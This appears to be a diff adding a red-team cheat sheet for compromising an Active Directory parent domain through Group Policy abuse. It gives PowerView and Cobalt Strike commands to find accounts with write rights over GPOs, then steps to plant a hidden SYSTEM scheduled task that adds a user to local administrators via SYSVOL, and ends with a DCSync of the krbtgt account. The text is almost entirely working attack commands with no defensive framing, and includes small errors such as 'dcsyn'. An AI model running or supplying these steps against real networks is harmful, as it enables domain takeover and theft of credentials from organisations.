@@ -1,0 +1,50 @@
+powershell-import /path/to/PowerView.ps1
+
+#command to enum who had edit right over GPOs in a foreign domain http://bit.ly/2xfadxg:
+
+Get-DomainObjectAcl -Domain 'PARENT_DOMAIN' -LDAPFilter '(objectCategory=groupPolicyContainer)' -ResolveGUIDs | ? {
+  ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and `
+  ($_.ActiveDirectoryRights -match 'WriteProperty | GenericAll | GenericWrite | WriteDacl | WriteOwner')
+}
+
+#Compressed to oneliner:
+powerpick Get-DomainObjectAcl -Domain 'PARENT_DOMAIN' -LDAPFilter '(objectCategory=groupPolicyContainer)' -ResolveGUIDs | ? {($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty | GenericAll | GenericWrite | WriteDacl | WriteOwner')}
+
+#Get the SecurityIdentifier after run the command
+powerpick "#securityIdentifier; #securityIdentifier" | ConvertFrom-SID
+
+#check ObjectDN, get the CN value:
+powerpick Get-DomainGPO "$CN_Value" -Domain PARENT_DOMAIN
+
+#Check the display name and gpcfilesyspath value
+#Check the result of the command in line 14, and "ActiveDirectoryRights"
+powerpick Get-DomainOU -GPLink "$CN_Value" -Domain PARENT_DOMAIN | %{Get-DomainComputer -SearchBase $_.DistinguishedName -Ping -Properties dnshostname}
+
+# The result will be the machine (DC?) that the GPO applies to, and the User from line 14 has the right over it
+
+# Create a GPO manually on the attacker controlled system and upload to the right system---> wait for GPO replicate
+# From the standalone DC > GPOedit.msc > Group Policy Management > Forest > Domain > TestOU > Right click > Create New GPO and link it here > Right click > edit the new GPO 
+# New GPO > Computer Configuration > Preferences > Control Panel Settings > Schedule Tasks > New > Immediate Task (At Least Windows 7) > input name > Change User or Group to SYSTEM > Check "Run whether user is logged on or not" and "Run with highest Privileges" and "Hidden"
+
+# New task with cmd.exe > Add argument "/c net localgroup administrators DOMAIN\User_who_can_edit_GPO /add
+
+# After new GPO created > there is Unique ID
+# Take the Unique ID to C:\Windows\SYSVOL\domain\Policies\{UNIQ_ID}
+
+# Copy the GPO XML file to attacker machine.
+# edit the XML file to fit with the target network such as Author or you can change the command
+
+# on the cobaltStrike beacon, check on the the beacon own by the User_who_can_edit_GPO 
+
+# Right click > Explore > File Browser > \\PARENT_DOMAIN\SYSVOL\PARENT_DOMAIN\Policies\{User_who_can_edit_GPO_Uniq_ID}\Machine\
+
+# Create Preferences\ScheduledTasks inside Machine > Upload the xml to that folder
+#Make sure change the GPT.INI to +1 value and reupload to the target
+############################################
+
+powerpick Get-NetLocalGroupMember #DC
+
+dcsyn PARENT_DOMAIN DOMAIN\krbtgt
+
+
+
